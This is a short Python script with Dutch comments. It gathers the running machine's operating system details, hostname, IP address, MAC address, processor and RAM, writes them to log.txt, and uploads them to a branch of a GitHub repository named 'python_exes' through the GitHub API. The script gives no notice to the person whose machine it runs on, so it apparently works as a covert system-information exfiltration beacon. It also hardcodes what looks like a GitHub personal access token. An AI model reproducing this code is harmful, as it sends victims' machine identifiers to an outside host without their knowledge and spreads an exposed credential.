import platform,socket,re,uuid,json,psutil,logging
from github import Github
import base64

#deze functie komt van: https://stackoverflow.com/questions/3103178/how-to-get-the-system-info-with-python
def getSystemInfo():
    try:
        info={}
        info['platform']=platform.system()
        info['platform-release']=platform.release()
        info['platform-version']=platform.version()
        info['architecture']=platform.machine()
        info['hostname']=socket.gethostname()
        info['ip-address']=socket.gethostbyname(socket.gethostname())
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor']=platform.processor()
        info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        return json.dumps(info)
    except Exception as e:
        logging.exception(e)

with open('log.txt', 'w') as file:
    file.write(getSystemInfo())

 
username = "SemJeunen"
repo_name = "python_exes"
g = Github("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")
user = g.get_user(username)


repo = user.get_repo(repo_name)
log= repo.get_contents("log.txt", ref="sysinfo_log")
repo.update_file(log.path, "log", f"{log.content}\n{getSystemInfo()}", log.sha, branch="sysinfo_log")